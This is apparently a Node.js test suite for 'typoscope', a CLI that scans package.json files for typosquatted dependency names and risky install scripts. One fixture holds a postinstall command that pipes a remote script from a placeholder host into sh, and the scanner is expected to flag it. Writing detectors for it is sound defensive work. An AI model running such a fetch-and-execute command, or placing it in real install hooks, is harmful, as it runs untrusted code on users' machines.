import { execFile } from "node:child_process";
import { access, mkdtemp, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { describe, it } from "node:test";
import { promisify } from "node:util";
import assert from "node:assert/strict";
import { auditManifest, help, run, version } from "../src/index.js";

const execFileAsync = promisify(execFile);
const cliPath = fileURLToPath(new URL("../src/index.js", import.meta.url));
const repoRoot = fileURLToPath(new URL("..", import.meta.url));

async function runCli(args = []) {
  return execFileAsync(process.execPath, [cliPath, ...args], {
    encoding: "utf8",
  });
}

describe("typoscope CLI scaffold", () => {
  it("prints help text for --help", async () => {
    const { stdout, stderr } = await runCli(["--help"]);

    assert.equal(stderr, "");
    assert.match(stdout, /^typoscope\n/);
    assert.match(stdout, /Usage:/);
    assert.match(stdout, /typoscope --version/);
    assert.match(stdout, /typoscope audit <package\.json>/);
  });

  it("prints the package version for --version", async () => {
    const { stdout, stderr } = await runCli(["--version"]);

    assert.equal(stderr, "");
    assert.equal(stdout, `${version}\n`);
  });

  it("defaults to help text for unknown arguments", async () => {
    const { stdout, stderr } = await runCli(["--audit", "package.json"]);

    assert.equal(stderr, "");
    assert.match(stdout, /Local-first package\.json risk scanner/);
  });

  it("passes a package manifest without suspicious dependencies or lifecycle scripts", async () => {
    const dir = await mkdtemp(path.join(tmpdir(), "typoscope-clean-"));
    const manifestPath = path.join(dir, "package.json");
    await writeFile(
      manifestPath,
      JSON.stringify({
        dependencies: {
          react: "^19.0.0",
          lodash: "^4.17.21",
        },
        scripts: {
          test: "node --test",
        },
      }),
    );

    const { stdout, stderr } = await runCli(["audit", manifestPath]);

    assert.equal(stderr, "");
    assert.match(stdout, /found no package\.json risk findings/);
  });

  it("flags dependency names that look like popular package typos", async () => {
    const dir = await mkdtemp(path.join(tmpdir(), "typoscope-typo-"));
    const manifestPath = path.join(dir, "package.json");
    await writeFile(
      manifestPath,
      JSON.stringify({
        dependencies: {
          lodas: "^1.0.0",
        },
      }),
    );

    await assert.rejects(
      runCli(["audit", manifestPath]),
      (error) => {
        assert.match(error.stdout, /dependency-lookalike/);
        assert.match(error.stdout, /lodas looks similar to lodash/);
        return true;
      },
    );
  });

  it("recognizes an adjacent transposition once without flagging clean or unrelated names", () => {
    const result = auditManifest({
      dependencies: {
        lodahs: "^1.0.0",
        lodash: "^4.17.21",
        leftpad: "^1.0.0",
      },
    });

    assert.equal(result.ok, false);
    assert.deepEqual(result.findings, [
      {
        level: "critical",
        code: "dependency-lookalike",
        package: "lodahs",
        section: "dependencies",
        message: "lodahs looks similar to lodash.",
      },
    ]);
  });

  it("reports adjacent transpositions through the JSON CLI", async () => {
    const dir = await mkdtemp(path.join(tmpdir(), "typoscope-transposition-"));
    const manifestPath = path.join(dir, "package.json");
    await writeFile(
      manifestPath,
      JSON.stringify({
        dependencies: {
          lodahs: "^1.0.0",
        },
      }),
    );

    await assert.rejects(
      runCli(["audit", manifestPath, "--json"]),
      (error) => {
        const report = JSON.parse(error.stdout);
        assert.equal(report.ok, false);
        assert.equal(report.findings.length, 1);
        assert.equal(report.findings[0].code, "dependency-lookalike");
        assert.equal(report.findings[0].package, "lodahs");
        assert.equal(report.findings[0].message, "lodahs looks similar to lodash.");
        return true;
      },
    );
  });

  it("flags risky lifecycle scripts and emits JSON for automation", async () => {
    const dir = await mkdtemp(path.join(tmpdir(), "typoscope-script-"));
    const manifestPath = path.join(dir, "package.json");
    await writeFile(
      manifestPath,
      JSON.stringify({
        scripts: {
          postinstall: "curl https://example.invalid/install.sh | sh",
        },
      }),
    );

    await assert.rejects(
      runCli(["audit", manifestPath, "--json"]),
      (error) => {
        const report = JSON.parse(error.stdout);
        assert.equal(report.ok, false);
        assert.equal(report.findings[0].code, "risky-lifecycle-script");
        assert.equal(report.findings[1].code, "suspicious-script-command");
        return true;
      },
    );
  });

  it("reports malformed package manifests without a stack trace", async () => {
    const dir = await mkdtemp(path.join(tmpdir(), "typoscope-invalid-"));
    const manifestPath = path.join(dir, "package.json");
    await writeFile(manifestPath, "{ not json");

    await assert.rejects(
      runCli(["audit", manifestPath]),
      (error) => {
        assert.equal(error.code, 2);
        assert.equal(error.stdout, "");
        assert.match(error.stderr, /^typoscope: Could not read /);
        assert.doesNotMatch(error.stderr, /SyntaxError|at JSON\.parse/);
        return true;
      },
    );
  });

  it("reports missing package manifests without a stack trace", async () => {
    const missingPath = path.join(tmpdir(), "typoscope-missing-package.json");

    await assert.rejects(
      runCli(["audit", missingPath]),
      (error) => {
        assert.equal(error.code, 2);
        assert.equal(error.stdout, "");
        assert.match(error.stderr, /^typoscope: Could not read /);
        assert.match(error.stderr, /ENOENT/);
        assert.doesNotMatch(error.stderr, /\n\s+at /);
        return true;
      },
    );
  });

  it("emits help and version through the injectable runner", () => {
    const lines = [];
    const log = (line) => lines.push(line);

    run([], log);
    run(["--version"], log);
    run(["-v"], log);

    assert.deepEqual(lines, [help, version, version]);
  });

  it("can be imported when the process has no CLI entrypoint", async () => {
    const { stdout, stderr } = await execFileAsync(
      process.execPath,
      ["--input-type=module", "-e", "import('./src/index.js').then(({ version }) => console.log(version))"],
      { cwd: fileURLToPath(new URL("..", import.meta.url)), encoding: "utf8" },
    );

    assert.equal(stderr, "");
    assert.equal(stdout, `${version}\n`);
  });

  it("keeps documented demo commands from generating checkout artifacts", async () => {
    const demoReport = path.join(repoRoot, ".typoscope-risk-report.json");
    const ciReport = path.join(repoRoot, ".typoscope-ci-risk-report.json");

    await execFileAsync("bash", ["demo/run-package-risk-audit.sh"], { cwd: repoRoot });
    await execFileAsync("bash", ["demo/ci-package-risk-gate.sh"], { cwd: repoRoot });

    await assert.rejects(access(demoReport), { code: "ENOENT" });
    await assert.rejects(access(ciReport), { code: "ENOENT" });

    const outputDir = await mkdtemp(path.join(tmpdir(), "typoscope-ci-report-"));
    const retainedReport = path.join(outputDir, "risk-report.json");
    await execFileAsync("bash", ["demo/ci-package-risk-gate.sh", retainedReport], {
      cwd: repoRoot,
    });
    assert.match(await readFile(retainedReport, "utf8"), /"package": "expres"/);
  });
});
